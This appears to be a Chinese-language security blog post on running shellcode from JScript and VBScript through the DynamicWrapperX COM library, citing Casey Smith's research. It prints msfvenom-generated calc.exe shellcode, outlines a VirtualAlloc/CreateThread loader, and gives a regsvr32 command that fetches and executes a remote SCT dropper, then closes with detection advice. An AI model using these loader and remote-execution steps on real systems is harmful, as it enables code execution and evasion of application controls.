---
layout: post
title: Shellcode Via JScript & VBScript
---

**About:**
- DynamicWrapperX
- Generate shellcode
- Write JS and SCT script
- How to use
- Detection

**目录：**

- 介绍如何配置使用脚本附加库DynamicWrapperX
- 通过JS/VBS实现对win32 API的调用
- 如何在js脚本中加载shellcode
- 结合sct的攻击思路
- 补充在64位下的使用方法
- 对该方法的检测





**Reference:**

http://subt0x10.blogspot.com/2016/09/shellcode-via-jscript-vbscript.html


## 0x00 前言
----
Casey Smith@subTee近日更新了新的博客，介绍了如何利用脚本附加库DynamicWrapperX实现JS/VBS对win32 API的调用，我很感兴趣，于是对其进行了学习研究。本文用来记录测试心得并补充个人理解。


## 0x01 DynamicWrapperX简介
---

### 1. 下载获得dynwrapx.dll

**下载地址：**

http://www.script-coding.com/dynwrapx_eng.html



注册DynamicWrapperX:

```
regsvr32 /i dynwrapx.dll
```

卸载DynamicWrapperX:

```
regsvr32 /u /i dynwrapx.dll
```

**注：**

/i表示对当前用户操作，当前用户权限即可；如何不加/i，代表对所有用户操作，需要管理员权限

/s可去掉注册成功弹出的提示框

### 2. 通过JS/VBS来调用win32 API

注册组件后就可以通过JS/VBS来调用win32 API

js脚本弹框实例:

```
DX = new ActiveXObject("DynamicWrapperX");                  // Create an object instance.
DX.Register("user32.dll", "MessageBoxW", "i=hwwu", "r=l");  // Register a dll function.
res = DX.MessageBoxW(0, "Hello, world!", "Test", 4);        // Call the function.
```

注册前，js脚本执行失败，如图

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-9-13/2-1.png)


注册组件，执行

```
regsvr32 /i dynwrapx.dll
```

再次执行js脚本，成功弹框，如图

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-9-13/2-2.png)


成功调用win32 API


dynwrapx.dll是一个32位的dll，所以在64位系统下通过regsvr32 /i dynwrapx.dll注册后，在使用js调用win32 API时注意需要选择32位的cscript.exe，代码如下：

```
C:\Windows\SysWow64\cscript.exe a.js
```

如图,默认64位cscript.exe无法调用COM组件，换成32位，执行成功

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-9-13/2-3.png)



vbs脚本弹框实例：

```
Set DX = CreateObject("DynamicWrapperX")                    ' Create an object instance.
DX.Register "user32.dll", "MessageBoxW", "i=hwwu", "r=l"    ' Register a dll function.
res = DX.MessageBoxW(0, "Hello, world!", "Test", 4)         ' Call the function.
```

## 0x02 生成shellcode
---
使用msf：

```
use windows/exec
set CMD calc.exe
generate -t csharp
```

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-9-13/3-1.png)

获得shellcode

```
byte[] buf = new byte[193] {
0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,
0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,
0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 };
```



## 0x03 js脚本加载shellcode
---
**步骤：**

1. 通过VirtualAlloc申请一块具有RWX权限的内存，函数返回值为内存的基地址
2. 
2. 向这段内存写入shellcode
3. 调用CreateThread加载shellcode

实例代码如下：

https://gist.github.com/subTee/ca6ab8ec75ec38c213da580cd0de30fe

代码比较简洁，在此不做详细介绍，直接替换其中的shellcode，正常执行，如图
![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-9-13/3-2.png)


**注：**
VirtualAlloc第二个参数表示分配内存的大小，shellcode的长度不要超过这个数值

DynamicWrapperX 1.0提供了英文版说明，可对照语法进行二次开发，参考地址如下：

http://www.script-coding.com/dynwrapx_eng.html

DynamicWrapperX 2.0中默认提供英文帮助文档，语法有细微变化，需要注意

## 0x04 regsvr32利用方式
---
前面提到过dynwrapx.dll是一个32位的dll，注册的组件也只能供32位程序调用

所以在64位系统下使用需要注意如下：

1. 只支持x86 shellcode
2. 在64位系统下要使用syswow64文件夹下的32位程序

利用方式：

```
C:\Windows\SysWow64\regsvr32.exe /s /u /i:[sct路径] scrobj.dll
```

将js代码写到sct文件中，就可以将其放到服务器上

**实现远程调用sct的实例地址：**

https://gist.github.com/subTee/ca6ab8ec75ec38c213da580cd0de30fe



**自动化download, register dll, execute Shellcode的实例地址：**

https://gist.github.com/subTee/aa548b36b5d3c8f07e2024ab39217712

里面多了一个调用certuil.exe对文件进行base64加解密

cmd下执行如下代码实现远程调用sct：

```
C:\Windows\SysWow64\regsvr32.exe /s /u /i:https://gist.githubusercont
ent.com/subTee/aa548b36b5d3c8f07e2024ab39217712/raw/5dc12c648229574e6172a70ba13f
db220ef1a2e8/Dropper.Sct scrobj.dll
```

**注：**

使用前需要提前安装DynamicWrapperX

实际测试如图

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-9-13/3-5.png)


## 0x05 补充
---
最新的DynamicWrapperX已经支持x64，版本为DynamicWrapperX 2.0

**相关地址：**

http://www.minner.ru/html/Dynwrapx.html

在64位系统上面需要分别注册32位和64位的DynamicWrapperX

64位dll注册成功后，js脚本可直接运行，如图

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-9-13/3-3.png)


**注：**

使用DynamicWrapperX 2.0需要提前卸载DynamicWrapperX 1.0

否则，使用2.0需要将object改为DynamicWrapperX.2，如：

`new ActiveXObject("DynamicWrapperX")`改为`new ActiveXObject("DynamicWrapperX.2")`

如图
![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-9-13/3-4.png)



## 0x06 防御
---
该方法利用的前提是注册dynwrapx.dll，所以通过查看系统已注册的com组件就能够检测该方法

**推荐工具：**

```
RegDllView
```

**下载地址：**

http://www.nirsoft.net/utils/registered_dll_view.html

**特点：**

- 显示所有注册DLL/OCX / exe文件列表
- 查看注册的最近时间
- 查看CLSID和ProgID
- 可以手动卸载DLL/OCX文件
- 可以手动注册DLL/OCX文件


如图，通过查看已注册的COM控件，找到dynwrapx.dll

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-9-13/4-1.png)

手动卸载组件，即可限制该方法的运用。



---

[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)



